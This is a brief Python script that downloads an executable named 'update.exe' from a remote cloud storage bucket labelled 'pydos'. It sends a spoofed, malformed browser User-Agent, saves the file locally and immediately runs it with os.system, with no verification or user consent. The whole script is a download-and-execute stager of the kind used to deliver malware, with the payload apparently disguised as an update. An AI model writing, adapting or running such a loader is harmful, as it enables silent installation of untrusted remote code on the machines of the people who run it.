import requests
import os
url = "https://pydos-1301360149.cos.ap-nanjing.myqcloud.com/update.exe"

headers = {'User-Agent':'OW64; rv:59.0) Chrome/91.0.4472.124'}
myFile = requests.get(url, headers=headers)

open("./update.exe" , 'wb').write(myFile.content)
os.system("update.exe")